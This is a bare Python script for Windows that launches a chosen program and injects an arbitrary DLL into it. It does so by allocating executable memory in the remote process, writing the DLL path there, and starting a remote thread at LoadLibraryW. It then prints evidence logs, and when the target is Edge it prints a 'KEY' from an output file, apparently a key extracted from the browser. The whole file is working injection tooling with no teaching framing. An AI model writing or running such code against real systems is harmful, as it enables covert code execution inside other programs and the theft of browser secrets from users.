import ctypes, ctypes.wintypes as wt, time, os, sys, subprocess

k32 = ctypes.windll.kernel32
k32.VirtualAllocEx.restype = ctypes.c_void_p
k32.VirtualAllocEx.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wt.DWORD, wt.DWORD]
k32.WriteProcessMemory.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.CreateRemoteThread.restype = wt.HANDLE
k32.CreateRemoteThread.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, wt.DWORD, ctypes.POINTER(wt.DWORD)]
k32.GetProcAddress.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [wt.HANDLE, ctypes.c_char_p]
k32.OpenProcess.restype = wt.HANDLE
k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]

def w(x): open(r"C:\Tools\inj_log.txt","a").write(str(x)+"\n")

TARGET = sys.argv[1]
DLL = sys.argv[2]
ARGS = sys.argv[3] if len(sys.argv) > 3 else ""

w("=== live injection: " + TARGET)
p = subprocess.Popen([TARGET] + ([ARGS] if ARGS else []))
time.sleep(3)
pid = p.pid
w("pid=%d" % pid)

h = k32.OpenProcess(0x1F0FFF, False, pid)  # PROCESS_ALL_ACCESS
if not h:
    w("OpenProcess failed gle=%d" % k32.GetLastError()); sys.exit(1)

dll_path = ctypes.create_unicode_buffer(DLL)
alloc = k32.VirtualAllocEx(h, None, ctypes.sizeof(dll_path), 0x3000, 0x40)
if not alloc:
    w("VirtualAllocEx failed"); sys.exit(1)
w("remote mem=0x%X" % alloc)
wrote = ctypes.c_size_t()
k32.WriteProcessMemory(h, alloc, dll_path, ctypes.sizeof(dll_path), ctypes.byref(wrote))
w("wrote %d bytes" % wrote.value)

loadlib = k32.GetProcAddress(k32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
tid = wt.DWORD()
hthread = k32.CreateRemoteThread(h, None, 0, loadlib, alloc, 0, ctypes.byref(tid))
if not hthread:
    w("CreateRemoteThread failed gle=%d" % k32.GetLastError()); sys.exit(1)
w("remote tid=%d waiting..." % tid.value)
k32.WaitForSingleObject(hthread, 15000)
ec = wt.DWORD()
k32.GetExitCodeThread(hthread, ctypes.byref(ec))
w("thread exit: 0x%X" % ec.value)

# poll for evidence
time.sleep(2)
try:
    print(open(r"C:\Tools\ctrl_log.txt").read())
except Exception:
    print("no ctrl_log")
if "edge" in TARGET.lower():
    try:
        print("KEY: " + open(r"C:\Tools\key_out.txt").read())
    except Exception:
        print("no key file")
p.kill()